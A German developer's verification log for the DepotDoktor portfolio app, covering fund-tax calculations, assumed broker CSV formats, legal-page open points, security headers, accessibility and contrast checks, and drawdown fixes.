# Verifikation und offene Punkte (K1 DepotDoktor)

Stand: 07.10.2026 (Nachkontrolle und Nachbesserung, siehe die letzten beiden Abschnitte). Quellen zur Steuerlogik gehören hierher, nicht in den Code.

## Prüfstand der Steuerlogik

| Fall | Erwartung (ursprüngliche Spezifikation) | Test | Gegen offizielle Quelle geprüft |
|---|---|---|---|
| A Normalfall 2026, 10.000 €, Zuwachs 1.500 € | Basisertrag 224,00 €, steuerpflichtig 156,80 €, Steuer 41,36 € | `vorabpauschale.test.ts` | offen (Stiftung-Warentest-Rechner, Finanztip) |
| B Zuwachs 150 € unter Basisertrag | Vorabpauschale 150,00 €, Steuer 27,69 € | `vorabpauschale.test.ts` | offen |
| C Verlustjahr | Vorabpauschale 0 € | `vorabpauschale.test.ts` | offen |
| D Kauf am 1. Juli, Bezugswert 10.000 € | Basisertrag 112,00 €, Steuer 20,68 € | `vorabpauschale.test.ts` | offen, siehe unten |
| E FIFO 10 @ 80, 10 @ 100, Verkauf 12 @ 120 | Veräußerungsgewinn 440 € | `fifo.test.ts` | offen |

Zu Fall D: Seit 07.10.2026 kürzt der Code nach § 18 Abs. 2 InvStG die Vorabpauschale statt des Basisertrags. Der Test weist deshalb Basisertrag 224,00 € und Vorabpauschale 224,00 × 6/12 = 112,00 € aus; Vorabpauschale und Steuer (20,68 €) sind dieselben wie in der Spezifikation, weil der Wertzuwachs-Deckel nicht greift.

Rechtsgrundlagen: § 18 InvStG (Vorabpauschale), § 2 Abs. 11 InvStG (Ausschüttungen einschließlich Steuerabzug), § 20 InvStG (Teilfreistellung), BMF-Schreiben vom 13.01.2026 (Basiszins 2026: 3,20 %, Az. IV C 1 - S 1980/00230/012/001), BMF-Schreiben vom 10.01.2025 (Basiszins 2025: 2,53 %, Az. IV C 1 - S 1980/00230/009/002, BStBl I 2025, 273). Die Konstanten in `tax/constants.ts` wurden am 06.10.2026 gegen diese Schreiben und den Gesetzestext geprüft und stimmen (Abschnitt „Lückenschluss 06.10.2026“).

## Zu verifizieren

1. **Zwölftelung bei unterjährigem Kauf (Fall D).** Nach Gesetzeswortlaut umgesetzt (§ 18 Abs. 2 InvStG: „vermindert sich die Vorabpauschale um ein Zwölftel“); Abgleich mit einem externen Rechner offen. Seit 07.10.2026 ist `reductionTarget: "vorabpauschale"` der Standard; die Variante der ursprünglichen Spezifikation (Kürzung des Basisertrags) bleibt per Parameter wählbar und getestet. Beide Varianten liefern dasselbe Ergebnis, solange der Wertzuwachs-Deckel nicht greift; greift er, weichen sie ab (Kauf im Juli, Basisertrag 224 €, Zuwachs 150 €: Gesetz 75,00 €, Spezifikation 112,00 €). Der `todo`-Test für Fall D bleibt offen, bis der Abgleich tatsächlich erfolgt ist. Prüfen gegen: BMF-Anwendungsschreiben zum InvStG, Vorabpauschale-Rechner der Stiftung Warentest, Finanztip-Beispiel mit unterjährigem Kauf und geringem Zuwachs.
2. **Bezugsgröße bei unterjährigem Kauf.** Implementiert: Stück × Rücknahmepreis am Jahresanfang (auch für später gekaufte Anteile), Wertzuwachs = Stück × (Kurs 31.12. − Kurs 01.01.). Alternative: Anschaffungspreis als Bezugswert. Prüfen gegen dieselben Quellen wie Punkt 1. Offen.
3. **Basiszins vor 2025.** Nur 2025 und 2026 sind hinterlegt. Weitere Jahre erst nach Nachweis über das jeweilige BMF-Schreiben ergänzen (`apps/web/lib/depotdoktor/tax/constants.ts`). Offen.
4. ~~**Anrechnung versteuerter Vorabpauschalen beim Verkauf.** Eingabemöglichkeit fehlt.~~ Erledigt am 06.10.2026: Eingabe je Verkauf im Steuerreiter, Einzelheiten im Abschnitt „Lückenschluss 06.10.2026“. Weiter zu verifizieren (offen): ob die Minderung nach § 19 Abs. 1 Satz 3 InvStG einen Veräußerungsverlust ergeben darf (implementiert: rein rechnerische Minderung, der Gewinn kann negativ werden) und wie Banken den Betrag in der Verkaufsabrechnung ausweisen. Prüfen gegen: BMF-Anwendungsschreiben zum InvStG (Randziffern zu § 19), eine echte Verkaufsabrechnung mit angesetzten Vorabpauschalen.
5. **Sparerpauschbetrag, Kirchensteuer, Verlusttöpfe** sind nicht berücksichtigt; die Oberfläche sagt das.
6. **Ausschüttungen vor dem Kauf weiterer Anteile.** Implementiert (seit der Nachbesserung 07.10.2026): Eine Ausschüttung zählt je Anteil nur für die Anteile, die am Zahltag im Bestand waren (§ 2 Abs. 11 InvStG: „die dem Anleger gezahlten oder gutgeschriebenen Beträge“). Später im Jahr gekaufte Anteile mindern ihre Vorabpauschale nicht. Andere Lesart: Maßgeblich ist die Ausschüttung des Fonds je Anteil im Kalenderjahr, auch für Anteile, die erst danach gekauft wurden; Fondsgesellschaften weisen in ihren Steuerinformationen die Vorabpauschale je Anteil nach Abzug der Ausschüttungen des Jahres aus; ob Banken diesen Wert auch für erst danach gekaufte Anteile ansetzen, ist nicht geprüft. Beispiel: 100 Anteile aus 2025, 1,00 € je Anteil im März, Kauf weiterer 100 Anteile im September, Kurs 100 → 110, Basiszins 3,2 %. Umgesetzte Lesart 124,00 + 224,00 × 4/12 = 198,67 €, andere Lesart 124,00 + 124,00 × 4/12 = 165,33 €. Die umgesetzte Lesart ergibt die höhere Schätzung und ist die einzige, die sich aus dem Export allein bestimmen lässt: Hielt der Anleger am Zahltag keine Anteile, enthält der Export keine Ausschüttungsbuchung. Prüfen gegen: BMF-Anwendungsschreiben zum InvStG (Randziffern zu § 18), Vorabpauschale-Rechner der Stiftung Warentest, eine Jahressteuerbescheinigung mit unterjährigem Nachkauf nach einer Ausschüttung. Offen.

## Zu verifizieren an echten Exporten

1. **Trade-Republic-Kopfzeile.** In der ursprünglichen Spezifikation (nicht veröffentlicht) ist die 23-spaltige Kopfzeile nach `"tax"` abgeschnitten. Die Fixture `packages/csv/fixtures/traderepublic-synthetic.csv` verwendet eine angenommene Fortsetzung (`original_amount`, `fx_rate`, `currency`, `mcc_code`, `card_number`, `card_id`, `holder_name`, `seller_name`, `seller_city`, `isin`). Der Parser erkennt das Format an den zwölf Pflichtspalten `datetime, date, account_type, category, type, asset_class, name, shares, price, amount, fee, tax` und liest die übrigen Spalten nur, wenn sie vorhanden sind. Ob die ISIN im Export enthalten ist und wie die Spalte heißt, muss an einem echten Export geprüft werden. Offen.
2. **Trade-Republic-Werte in `category` und `type`.** Die Zuordnung (Kauf, Verkauf, Dividende, Zinsen, Einzahlung, Kartenzahlung, Gebühr, Steuer) arbeitet mit Schlüsselwörtern (`BUY`, `SELL`, `DIVIDEND`, `INTEREST`, `PAYIN`, `PAYOUT`, `CARD`, `FEE`, `TAX`, `SAVINGS_PLAN`, `SAVEBACK`, `ROUNDUP`). Unbekannte Werte landen als „Sonstiges“ mit Hinweis. Liste der echten Werte an einem Export sammeln. Offen.
3. **Vorzeichen des Betrags bei Trade Republic.** Der Parser normalisiert das Vorzeichen anhand der Buchungsart (Kauf negativ, Verkauf positiv), ist also gegen beide Konventionen robust. Trotzdem an einem Export prüfen, ob `amount` bei Käufen negativ ist. Offen.
4. **Scalable-Capital-Werte in `type` und `assetType`.** Bekannt aus dem PP-Forum: `Buy`, `Security`. Angenommen: `Sell`, `Distribution`, `Deposit`, `Withdrawal`, `Interest`, `Fee`, `Cash`. Zeilen mit `status` ungleich `Executed` werden übersprungen. Offen.
5. **Assetklasse bei Scalable Capital.** `assetType = Security` unterscheidet nicht zwischen Aktie und ETF; solche Positionen erscheinen als „Nicht zugeordnet“ mit dem Hinweis „Der Export enthält keine Assetklasse“. Den Fondstyp wählt der Nutzer im Steuerreiter; seit 07.10.2026 steht dort bei Scalable-Positionen ohne Assetklasse der Hinweis „Der Scalable-Export unterscheidet nicht zwischen Aktie und Fonds. Bitte prüfen Sie den Fondstyp.“ Der Standard-Fondstyp bleibt Aktienfonds (Entscheidung des Autors offen).
6. **Betrag netto oder brutto bei Ausschüttung und Verkauf.** Am echten TR- und Scalable-Export prüfen, ob `amount` netto ist, also nach Gebühr und Steuerabzug. DepotDoktor behandelt `amount` bei Ausschüttungen und seit der Nachbesserung 07.10.2026 auch bei Verkäufen als Nettobetrag: Für die Vorabpauschale zählt `|amount| + |tax|` als Bruttoausschüttung (§ 2 Abs. 11 InvStG), für den Veräußerungsgewinn `|amount| + |tax|` als Erlös nach Gebühr (§ 20 Abs. 4 EStG: Die abgeführte Steuer ist keine Veräußerungskost). Wäre `amount` schon brutto, würde der Steuerabzug doppelt gezählt; die Vorabpauschale wäre zu niedrig, der Gewinn zu hoch geschätzt. Ebenfalls offen: welches Vorzeichen eine Steuererstattung in der Spalte `tax` hat. Der Parser entfernt das Vorzeichen; eine Erstattung (etwa bei einem Verlustverkauf nach versteuerten Gewinnen) würde deshalb wie ein Steuerabzug addiert statt abgezogen. Offen.

## Rechtstexte (Schritt 6), zu verifizieren

Die Texte unter `/impressum`, `/datenschutz` und `/nutzungsbedingungen` wurden ohne juristische Prüfung erstellt. Offene Punkte, die der Autor prüfen oder entscheiden muss:

1. **Impressum ohne Anschrift.** Der Autor möchte keine Adresse auf der Seite; genannt sind Name, Ort und E-Mail. § 5 DDG verlangt für „geschäftsmäßige“ Telemedien eine ladungsfähige Anschrift; für rein private, nicht-kommerzielle Seiten gilt die Pflicht nach herrschender Lesart nicht. Eine Portfolio-Seite zur Bewerbung liegt dazwischen. Optionen: (a) so lassen und das Risiko einer Abmahnung tragen, (b) Adresse ergänzen, (c) Impressum-Service mit c/o-Adresse nutzen. Prüfen gegen: BMJ-Leitfaden zur Impressumspflicht, Verbraucherzentrale, e-recht24. Offen.
2. **Vercel als Auftragsverarbeiter.** Anschrift von Vercel Inc. und die Angabe zur Zertifizierung unter dem EU-US Data Privacy Framework gegen https://vercel.com/legal/privacy-notice und https://www.dataprivacyframework.gov prüfen. Ein Auftragsverarbeitungsvertrag (DPA) mit Vercel ist Teil der Vercel-Nutzungsbedingungen; im Dashboard nachsehen, ob er akzeptiert wurde. Offen.
3. **Nutzungsbedingungen.** Ein vollständiger Haftungsausschluss ist nach § 309 Nr. 7 BGB unwirksam; der Text beschränkt die Haftung deshalb auf Vorsatz, grobe Fahrlässigkeit und Personenschäden und verweist für die unentgeltliche Überlassung auf §§ 521, 599 BGB. Ob diese Formulierung trägt, ist juristisch zu prüfen. Offen.
4. **Kontaktadresse.** Im Impressum steht die private Gmail-Adresse. Falls eine eigene Domain kommt, auf eine Adresse dieser Domain umstellen (`packages/legal/src/operator.ts`). Offen.
5. **Normangabe im Disclaimer.** Seit 07.10.2026 „im Sinne von § 2 Abs. 8 Satz 1 Nr. 10 WpHG“ statt der bisherigen Angabe „Paragraf 85 WpHG“; dieser Paragraf regelt Anlage- und Anlagestrategieempfehlungen, die Legaldefinition der Anlageberatung steht in § 2 Abs. 8 Satz 1 Nr. 10 WpHG. Titel und Datum des BaFin-Merkblatts „Hinweise zum Tatbestand der Anlageberatung“ (Stand Februar 2025, veröffentlicht am 10.02.2025) am 07.10.2026 auf bafin.de geprüft: stimmen. Das Merkblatt selbst stützt die Definition auf § 1 Abs. 1a Satz 2 Nr. 1a KWG und § 2 Abs. 2 Nr. 4 WpIG; die WpHG-Norm ist die gleichlautende Definition für Wertpapierdienstleistungen. Ob die Normangabe ganz entfallen soll, entscheidet der Autor (offen).

## Abweichungen von der ursprünglichen Spezifikation

- **Ableitung im Newton-Beispiel.** Die Spezifikation nennt NPV′(0,08) ≈ −25.833. Nachgerechnet: NPV′(0,08) = 5.000/1,08² − 2 · 17.600/1,08³ = 4.286,69 − 27.942,89 = −23.656,20. Der erste Newton-Schritt landet damit bei 0,0994 statt 0,0978. Am Ergebnis (IRR = 10 %) ändert das nichts.
- **Steuer-Quellen in Kommentaren.** Die Projektregeln verbieten Kommentarzeilen. Quellen stehen deshalb in dieser Datei und in den Testnamen.
- **Floats in den Code-Beispielen.** Die Skizzen rechnen mit `number`; umgesetzt ist decimal.js für alle Geldbeträge. Nur der IRR-Löser (Nullstellensuche einer Rate) arbeitet mit `number`, die Zahlungsströme werden an der Schnittstelle konvertiert.
- **Zwölftelung.** Die Spezifikation kürzt den Basisertrag, umgesetzt ist seit 07.10.2026 die Kürzung der Vorabpauschale nach § 18 Abs. 2 InvStG (siehe „Zu verifizieren“, Punkt 1).

## Getroffene Entscheidungen (03.09.2026, vom Autor noch nicht ausdrücklich bestätigt)

1. Depotsicht für TTWROR und IRR: Käufe, Verkäufe, Dividenden, Gebühren und Steuern sind externe Zahlungsströme; Einzahlungen, Auszahlungen und Zinsen des Verrechnungskontos fließen nicht ein. Begründung: Die Vorabpauschale betrifft nur das Depot, Kontozinsen würden die Depotrendite verfälschen. Seit 07.10.2026 bestimmen Kontobuchungen auch weder den Zeitraum noch die Bewertungspunkte (Abschnitt „Nachkontrolle 07.10.2026“).
2. Volatilität und Max Drawdown werden ohne Tageskurse angezeigt, mit Hinweis in Oberfläche und PDF.
3. Keine Vercel Web Analytics. Seit 07.10.2026 beschreiben Datenschutzerklärung und README genau, welche Anfragen nach dem Laden noch entstehen (Programmteile und Seitendaten vom selben Server, keine Dateiinhalte); der E2E-Test prüft das bei jedem Pull Request.
4. PDF-Report nutzt die eingebauten PDF-Schriften (Helvetica, Times), damit keine Schriftdatei nachgeladen werden muss. Zeichen außerhalb von WinAnsi (Minuszeichen U+2212, Pfeil, schmale Leerzeichen) werden vor dem Rendern ersetzt.
5. Diagramme verwenden nur Grün als Datenfarbe (eine Serie je Diagramm). Die Projektpalette (Gold, Grün, Bordeaux, Schwarz) besteht den Farbsehschwäche-Test für mehrfarbige Kategorien nicht; sobald ein Diagramm mehrere Serien braucht, sind Beschriftung oder Muster statt Farbe nötig.

## Dateityp-Prüfung 09.09.2026

Anlass: Beim Test von KontoKlar (K2) zog der Autor einen PDF-Kontoauszug in das CSV-Feld; die Anwendung las die Binärdatei als Text und zeigte Bytemüll als „erkannte Kopfzeile“. DepotDoktor hatte dieselbe Lücke: `file.text()` dekodierte jede Datei als UTF-8, die Kopfzeilenerkennung schlug fehl, und die Meldung „Format nicht erkannt“ zitierte die ersten Bytes der PDF als „gefundene Spalten“.

Umgesetzt:

1. `packages/csv/src/filekind.ts`: `detectFileKind` prüft die Bytes vor jeder Textverarbeitung. `%PDF-` ergibt `pdf`, `PK` (ZIP, damit auch xlsx/docx) ergibt `zip`, Nullbytes oder mehr als 5 % Steuerzeichen in den ersten 4 KB ergeben `binary`, 0 Byte ergibt `empty`. Nur `text` gelangt zum Parser. Zu jeder Nicht-Text-Art gibt es eine deutsche Meldung mit dem Exportweg beider Broker. Seit 07.10.2026 rät die Meldung bei ZIP- und Excel-Dateien, den CSV-Export erneut beim Broker herunterzuladen und unverändert hochzuladen, statt ihn in Excel zu speichern (Excel verändert Trennzeichen, Dezimalzeichen und Datumsformat).
2. `decodeCsvBytes` dekodiert UTF-8 strikt und fällt bei ungültigen Sequenzen auf Windows-1252 zurück; vorher wurden Umlaute aus Latin-Exporten als U+FFFD gelesen.
3. `parseBrokerCsv` bricht zusätzlich bei Text ab, der mit `%PDF-` beginnt (zweite Sicherung für Aufrufer, die einen String übergeben).
4. Drop-Zone nennt ausdrücklich: nur CSV, keine PDF-Kontoauszüge, keine Excel-Dateien.
5. Tests: 12 Unit-Tests (`filekind.test.ts`) mit Signaturen, Steuerzeichen-Anteil, BOM, Windows-1252 und PDF-Text im Parser; 2 Playwright-Tests laden eine PDF- und eine xlsx-Datei hoch und erwarten die Meldung ohne Report und ohne „Gefundene Spalten“.

~~Nicht abgedeckt: UTF-16-Exporte.~~ Seit 06.10.2026 werden UTF-16-Dateien mit BOM (`FF FE` little endian, `FE FF` big endian) erkannt und dekodiert; UTF-16 ohne BOM wird weiterhin als Binärdatei abgelehnt (siehe Abschnitt „Lückenschluss 06.10.2026“).

## Gesamtprüfung 06.09.2026 (Funktion, Datenschutz, Sicherheit, Layout, Zugänglichkeit)

Geprüft: Typecheck, Lint, 115 Unit-Tests, Build, 5 Playwright-Tests gegen den Prod-Server, `pnpm audit`, axe-core (WCAG 2.1 AA und Best Practices) auf allen Seiten und Reitern in Desktop- und Mobilbreite, Tastaturreihenfolge, Antwort-Header, PDF-Ausgabe.

Behoben:

1. **Sicherheits-Header.** `next.config.ts` setzt Content-Security-Policy (`connect-src 'self'`, `frame-ancestors 'none'`, `object-src 'none'`; `'wasm-unsafe-eval'` für die Yoga-Layout-Engine von @react-pdf; `connect-src` zusätzlich `data:`, weil Yoga sein WASM-Binary per `fetch` auf eine data-URL lädt und sonst eine CSP-Verletzung meldet, bevor es auf die Base64-Dekodierung zurückfällt; `data:` ist kein Netzwerkziel), X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy, Strict-Transport-Security und Cross-Origin-Opener-Policy. `connect-src 'self'` macht das Datenschutzversprechen technisch durchsetzbar: Der Browser blockiert jede Hintergrundanfrage (fetch, XHR) an fremde Hosts, `default-src 'self'` und `form-action 'self'` dazu Subressourcen und Formularziele. Seitenaufrufe über einen angeklickten externen Link begrenzt die CSP nicht. Der E2E-Test mit PDF-Download läuft unter dieser Policy. Stand 07.10.2026 siehe Abschnitt „Sicherheit“ unten.
2. **Abhängigkeiten.** `pnpm audit` meldete damals vier Lücken in `postcss` (transitiv über `next`, nur Build-Zeit); Override `postcss >= 8.5.23` in `package.json`. Stand 07.10.2026: pnpm audit: nur braces über eslint-config-next (Dev, ohne Patch); Einzelheiten im Abschnitt „Nachkontrolle 07.10.2026“.
3. **Layout mobil.** Die Kopfzeile lief bei 390 px Breite über den Rand (horizontales Scrollen auf allen Seiten). Navigation umbricht jetzt. Die Reiterleiste scrollt seit 07.10.2026 mobil horizontal, statt umzubrechen.
4. **Kontrast.** Gold `#b8962e` erreicht auf Papier nur 2,7:1. Für Text gibt es `--color-gold-deep` (heute `#7d5f17`); Gold bleibt für Linien und Flächen. Betroffen: „Projekt K1“, Hinweis „Deckel“, Hover-Farbe der Links.
5. **Zugänglichkeit.** Reiter nach WAI-ARIA-Muster (`aria-controls`, `tabpanel`, Pfeiltasten, Home/End, Roving Tabindex); horizontal scrollbare Tabellen mit `tabindex="0"` und Beschriftung erreichbar; Sprunglink „Zum Inhalt springen“; sichtbarer Fokusring in Gold-Deep; Datei-Input mit `aria-label`; Navigation als Liste mit `aria-label`. axe-core meldete keine Verstöße mehr.
6. **Datei-Eingabe.** Dateien über 25 MB werden mit Meldung abgelehnt, Lesefehler werden abgefangen statt unbehandelt zu bleiben.
7. **CSV-Export.** Textzellen, die mit `=`, `+`, `@`, Tab oder einem Minus ohne Ziffer beginnen, erhalten ein führendes Apostroph (Schutz vor Formelauswertung in Tabellenkalkulationen). Unit-Test ergänzt.
8. **Favicon** (`apps/web/app/icon.svg`), vorher 404 in der Konsole.
9. **PDF.** Erstellungsdatum nutzt die lokale Zeit statt UTC.
10. **README.** „Papa Parse (Web Worker)“ gestrichen (kein Worker im Einsatz), Volatilitätsbeschreibung präzisiert, „Kirchensteuer optional“ und Sparerpauschbetrag als nicht berücksichtigt ausgewiesen, Roadmap-Stand aktualisiert.

Damals nicht geändert, vom Autor zu entscheiden:

1. ~~**„Quelloffen“ und „auf GitHub“.**~~ Erledigt. Seit 07.10.2026 ist der Code öffentlich unter mirkan-morgenfels-ai/depotdoktor; die Seiten verlinken ihn.
2. **Steuerjahr-Vorbelegung.** Der Reiter Steuer startet mit 2026, obwohl das Jahr läuft; der Kurs 31.12.2026 existiert noch nicht. Alternative: letztes abgeschlossenes Jahr oder Jahr der letzten Buchung vorbelegen. Offen (Entscheidung des Autors); seit 07.10.2026 zeigt der Reiter ohne vollständige Kurse aber kein Schein-Ergebnis mehr.
3. ~~**Max Drawdown nach Vollverkauf.**~~ Erledigt am 06.10.2026, Begründung und Testfälle im Abschnitt „Lückenschluss 06.10.2026“.
4. ~~**Standardwerte im Steuerreiter.**~~ Erledigt am 07.10.2026: Kurs 01.01. und 31.12. waren mit demselben Wert vorbelegt, die Kacheln zeigten dann 0,00 €. Jetzt stammt der Kurs 01.01. nur aus dem Vorjahr; fehlt ein Kurs oder stammen beide aus derselben Buchung, zeigen die Kacheln „–“ und „Kurse eintragen“, vorbelegte Werte sind als „vorläufig (Kurs aus dem Export)“ gekennzeichnet. Einzelheiten im Abschnitt „Nachkontrolle 07.10.2026“.
5. ~~**Kurse im Steuerreiter gelten für alle Steuerjahre.**~~ Erledigt am 07.10.2026 nach Option (a), entschieden vom Autor: Kurs 01.01. und 31.12. werden je Steuerjahr und Position gespeichert, der Fondstyp weiter je Position. Beim Wechsel des Steuerjahres erscheinen die für dieses Jahr eingegebenen Kurse oder, ohne Eingabe, die Vorbelegung dieses Jahres, nie die Kurse eines anderen Jahres. Eine Änderung des Fondstyps gilt für alle Jahre und schreibt keine Kursvorbelegung mehr fest. Die Eingaben zu angesetzten Vorabpauschalen je Verkauf sind unverändert. Der PDF-Export nutzt die Kurse des gewählten Jahres und nennt das Jahr in der Fußnote. Einzelheiten im Abschnitt „Kurse je Steuerjahr 07.10.2026“. Ursprünglicher Befund vom 06.10.2026: Fondstyp, Kurs 01.01. und Kurs 31.12. hingen gemeinsam an der Position; wer 2026 Kurse eintrug und auf 2025 umschaltete, sah dieselben Werte unter „Kurs 01.01.2025“. Schon eine Änderung des Fondstyps hat die Kursvorbelegung des gerade gewählten Jahres für alle Jahre festgeschrieben. Optionen waren (a) Kurse je Jahr speichern, Fondstyp je Position behalten, (b) beim Jahreswechsel alle Eingaben zurücksetzen, (c) so lassen.

## Lückenschluss 06.10.2026

Umgesetzt in den Commits `854bbce` bis `71438f0` der öffentlichen Historie.

### Prüfergebnisse

Lokal unter Windows 11 mit Node 22.23.2, pnpm 10.34.5 und Chromium Headless Shell 1234. `packageManager` steht wie in K2 und K3 auf `pnpm@10.34.5`; die CI übernimmt die Version aus `packageManager`.

| Schritt | Ausgangslage vor den Änderungen | Nach den Änderungen |
|---|---|---|
| `pnpm install --frozen-lockfile` | grün | grün |
| `pnpm typecheck` | grün | grün |
| `pnpm lint` | grün | grün |
| `pnpm test` | 127 Tests grün (csv 42, pdf 1, web 84) und 1 offener `todo` | 155 Tests grün (csv 50, pdf 1, web 104) und 1 offener `todo` |
| `pnpm build` | grün | grün |
| `pnpm test:e2e` mit `CI=true` gegen den Produktionsserver | 7 Tests grün | 10 Tests grün |
| axe-core 4.14 (WCAG 2.1 AA und Best Practices), 11 Seitenzustände je Desktop 1280 px und Mobil 390 px | nicht gemessen | 0 Verstöße |

Der offene `todo` ist Fall D (Bezugsgröße und Kürzungsregel bei unterjährigem Kauf), siehe „Zu verifizieren“, Punkt 1 und 2.

### Texte zu Quellcode und Startseite

- Damals: Startseite, Impressum, Datenschutzerklärung und Nutzungsbedingungen sagten nur, dass der Quellcode unter der MIT-Lizenz steht, ohne Link, solange das Repository nicht öffentlich war.
- Stand 07.10.2026: Startseite, Fußzeile, Projektseite, Impressum und Nutzungsbedingungen verlinken das öffentliche Repository `mirkan-morgenfels-ai/depotdoktor`; die Kopfzeile verlinkt Start, DepotDoktor, KontoKlar und NetzRadar, aber kein Repository. Die Startseite verlinkt KontoKlar (https://kontoklar-eight.vercel.app/projects/kontoklar) und NetzRadar (https://netzradar.vercel.app/projects/netzradar) mit `rel="noopener noreferrer"` im selben Tab, dazu je Projekt das Repository. Abschnitt 6 der Datenschutzerklärung nennt KontoKlar, NetzRadar und GitHub. Die E2E-Tests in `e2e/site.spec.ts` prüfen Ziele, `rel` und das Fehlen von `target`.

### CI

- Playwright-Reporter in der CI: `[["list"], ["html", { open: "never" }]]` statt `"github"`. Dadurch entsteht `apps/web/playwright-report/`, das `upload-artifact` bei Fehlern hochlädt; vorher war das Artefakt leer. Lokal geprüft: Der Ordner entsteht mit `index.html`.
- `pnpm/action-setup@v6` und `actions/upload-artifact@v7` wie in K3. Beide Tags existieren (am 06.10.2026 per `gh api` geprüft).

### Zeilenenden

`.gitattributes` mit `* text=auto eol=lf`, `*.pdf binary`, `*.png binary`. Alle Textdateien liegen im Index bereits mit LF vor (`git ls-files --eol`). Nach dem Anlegen zeigt `git status` keine zusätzlichen geänderten Dateien; eine Renormalisierung ist nicht nötig.

### Palette und Kontrast

Hex-Werte an K2 und K3 angeglichen, die Token-Namen bleiben. Geändert in `globals.css`, `packages/charts/src/theme.ts`, `packages/pdf/src/ReportDocument.tsx` und `apps/web/app/icon.svg`:

| Token | alt | neu |
|---|---|---|
| ink | #141414 | #111111 |
| paper | #fbf9f4 | #fbfaf6 |
| surface | #ffffff | #ffffff |
| line | #e2dccf | #e3e0d6 |
| muted | #6b665c | #6b6b66 |
| gold | #b8962e | #b8912f |
| gold-deep | #7f6619 | #7d5f17 |
| gold-soft | #f3ead0 | #f3e9c9 |
| green | #2f5d3a | #2f6b3a |
| green-soft | #e3ede4 | #dfeadf |
| bordeaux | #6e1e2b | #7a1f2b |
| bordeaux-soft | #f1e1e3 | #f1dcdf |

Kontrast nach WCAG 2.1 (relative Leuchtdichte, sRGB). Für Text gilt AA 4,5:1:

| Text auf Fläche | alt | neu |
|---|---|---|
| muted auf paper | 5,42 | 5,13 |
| muted auf surface | 5,71 | 5,36 |
| muted auf gold-soft | 4,75 | **4,42** |
| gold-deep auf paper | 5,23 | 5,71 |
| gold-deep auf surface | 5,50 | 5,96 |
| gold-deep auf gold-soft | 4,58 | 4,92 |
| green auf paper | 7,26 | 6,12 |
| green auf surface | 7,64 | 6,39 |
| bordeaux auf surface | 11,15 | 10,20 |
| bordeaux auf bordeaux-soft | 8,82 | 7,79 |
| paper auf ink | 17,51 | 18,08 |
| paper auf green (Hover der Schaltflächen) | 7,26 | 6,12 |
| gold auf surface | 2,82 | 2,95 |

Folgen:

1. Grau auf Gold-Soft liegt mit 4,42:1 knapp unter AA. Das kam nur in der Drop-Zone vor, während eine Datei darübergezogen wird; die beiden Hinweiszeilen sind in diesem Zustand jetzt `ink`.
2. Gold erreicht auch mit dem neuen Wert keine 4,5:1 und bleibt Linien und Flächen vorbehalten. Im PDF war die kleine Kopfzeile über dem Titel noch in Gold gesetzt; sie nutzt jetzt Gold-Deep (5,96:1 auf Weiß). Seit 07.10.2026 ist auch der Fokusring der Schaltflächen Gold-Deep statt Gold.
3. axe-core fand weder in Desktop- noch in Mobilbreite Verstöße. Geprüft wurden Startseite, die drei Rechtsseiten, die Projektseite, alle vier Reiter mit der Beispieldatei und der Steuerreiter mit Verkauf, einmal mit gültiger und einmal mit ungültiger Eingabe. Die Drop-Zone im Ziehzustand prüft axe nicht; dafür gilt die Rechnung oben.
4. Die README-Screenshots (`docs/screenshots/`) wurden damals mit der neuen Palette neu erzeugt: Trade-Republic-Testdatei, Viewport 1280 px, Skalierung 1,5, ETF-Kurs 31.12. auf 95,00 €.

### UTF-16-Exporte

`packages/csv/src/filekind.ts` erkennt nach der PDF- und ZIP-Prüfung die BOM `FF FE` (UTF-16 LE) und `FE FF` (UTF-16 BE). Die ersten 4 KB nach der BOM werden mit `TextDecoder("utf-16le")` bzw. `TextDecoder("utf-16be")` dekodiert; die Prüfung auf Null- und Steuerzeichen läuft dann auf den Codeeinheiten statt auf den Bytes. `decodeCsvBytes` dekodiert die ganze Datei mit derselben Kodierung und entfernt die BOM. Ohne BOM bleibt es beim bisherigen Verhalten: UTF-8 strikt, sonst Windows-1252. UTF-16 ohne BOM enthält Nullbytes und wird weiter abgelehnt.

Tests in `filekind.test.ts`, alle mit von Hand gebauten Byte-Arrays:

- „Datum;Typ\r\n“ in UTF-16 LE
- „Gebühr;10 €“ in UTF-16 BE (ü = `00 FC`, € = `20 AC`)
- € in LE als `AC 20`
- UTF-16 ohne BOM bleibt Binärdatei
- BOM vor Null-Codeeinheiten ist Binärdatei
- 1 Steuerzeichen unter 10 Codeeinheiten (10 % > 5 %) ist Binärdatei
- nur BOM ist leer
- Scalable-Export als UTF-16 LE wird vollständig eingelesen

E2E: Die Trade-Republic-Testdatei als UTF-16 LE mit BOM ergibt denselben Report (8 Buchungen; TTWROR damals +2,41 %, seit 07.10.2026 +2,40 %).

### Max Drawdown nach Vollverkauf

Bisher wurde der Drawdown-Index am ersten Bewertungspunkt mit Bestand nach einem Punkt ohne Bestand auf 1 zurückgesetzt, der alte Höchststand blieb aber stehen. Das ergab je nach Vorgeschichte einen zu hohen oder einen zu niedrigen Wert. Ein Depotwert von 0 nach dem Vollverkauf zählte dagegen nicht als −100 %, weil der Verkaufserlös als Zahlungsstrom in die Periodenrendite eingeht.

Neu in `metrics/drawdown.ts`: Der Index startet beim ersten Punkt mit Bestand bei 1 und wird danach nie zurückgesetzt. Perioden, die an einem Punkt ohne Bestand beginnen, gehen mit 0 % ein. Der Index ist damit genau die Verkettung, aus der auch die TTWROR entsteht (`periodReturns` überspringt dieselben Perioden). Der Drawdown misst nur Kursrückgänge, während Kapital investiert ist; die Zeit ohne Bestand ist neutral. Seit 07.10.2026 rechnet der Drawdown direkt auf `periodReturns`, einschließlich der Zuflüsse in ein leeres Depot (Abschnitt „Nachkontrolle 07.10.2026“).

| Fall (Wert / Zahlungsstrom je Buchungstag) | alt | neu | Handrechnung neu |
|---|---|---|---|
| 1.000 / +1.000, 0 / −1.100, 450 / +450, 405 / 0 | 18,18 % | 10,00 % | Index 1, 1,1, 1,1, dann 1,1 × 405/450 = 0,99; (1,1 − 0,99)/1,1 = 10 % |
| dieselben ersten drei Punkte (Neukauf ohne Kursänderung) | 9,09 % | 0,00 % | Index bleibt 1,1 |
| 1.000 / +1.000, 0 / −900, 0 / −5 (Ausschüttung nach dem Verkauf) | 10,00 % | 10,00 % | Index 1, dann 0,9, danach unverändert; kein −100 % |
| 1.000 / +1.000, 0 / −800, 500 / +500, 400 / 0 | 20,00 % | 36,00 % | Index 1, 0,8, 0,8, dann 0,8 × 400/500 = 0,64 |

